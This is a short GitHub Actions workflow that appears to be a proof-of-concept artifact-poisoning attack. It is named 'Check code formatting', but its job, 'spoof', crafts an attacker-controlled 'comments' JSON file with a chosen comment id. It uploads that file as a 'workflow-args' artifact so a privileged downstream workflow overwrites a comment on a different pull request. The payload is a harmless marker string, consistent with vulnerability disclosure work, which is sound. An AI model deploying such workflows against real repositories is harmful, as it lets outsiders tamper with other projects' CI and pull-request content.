name: Check code formatting
on:
  pull_request:
    branches:
      - main
permissions:
  contents: read
jobs:
  spoof:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled artifact
        run: |
          cat > comments <<'JSON'
          [{"id":6537988310,"body":"GAB-POC-PDFTOMARK: comment on a DIFFERENT pull request was overwritten by attacker-controlled artifact content."}]
          JSON
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: workflow-args
          path: comments
